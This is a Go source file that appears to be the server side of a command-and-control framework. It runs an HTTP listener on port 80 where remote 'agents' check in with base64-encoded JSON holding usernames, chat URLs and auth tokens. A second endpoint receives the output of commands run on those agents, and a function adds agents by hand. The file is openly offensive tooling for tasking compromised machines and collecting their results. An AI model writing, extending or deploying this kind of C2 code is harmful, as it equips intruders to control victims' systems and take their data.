package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
)

var BindIp string

type CommandResponse struct {
	Command string `json:"command"`
	Output  string `json:"output"`
	AgentID string `json:"agentid"`
	Success bool   `json:"success"`
}

type Agent struct {
	AgentId           string
	Username          string
	ChatUrl           string
	AuthToken         string
	CommandHistory    []string
	CommandHistoryCmd []string
	AgentType         string
}

func StartHttpListener(agentChan chan Agent, commandResponsesChan chan CommandResponse) {
	http.HandleFunc("/hello/", func(w http.ResponseWriter, r *http.Request) {
		base64EncodedAgent := strings.TrimPrefix(r.URL.Path, "/hello/")
		decoded, _ := base64.StdEncoding.DecodeString(base64EncodedAgent)

		var agent Agent
		_ = json.Unmarshal(decoded, &agent)
		agentChan <- agent
		// might need to add an automatic add to agent type here
	})

	http.HandleFunc("/command/", func(w http.ResponseWriter, r *http.Request) {
		encodedResponse := strings.TrimPrefix(r.URL.Path, "/command/")
		decoded, _ := base64.StdEncoding.DecodeString(encodedResponse)

		var response CommandResponse
		_ = json.Unmarshal(decoded, &response)
		commandResponsesChan <- response
		// might need to output commands to logs for testing
	})

	err := http.ListenAndServe(BindIp+":80", nil)
	if err != nil {
		fmt.Fprint(os.Stderr, err)
		os.Exit(1)
	}
}

func ManualAgentAdd(agentChan chan Agent, agentId string, username string) {
	agent := Agent{
		AgentId:           agentId,
		Username:          username,
		ChatUrl:           "",
		AuthToken:         "",
		CommandHistory:    []string{},
		CommandHistoryCmd: []string{},
		AgentType:         "manual",
	}

	agentChan <- agent
}
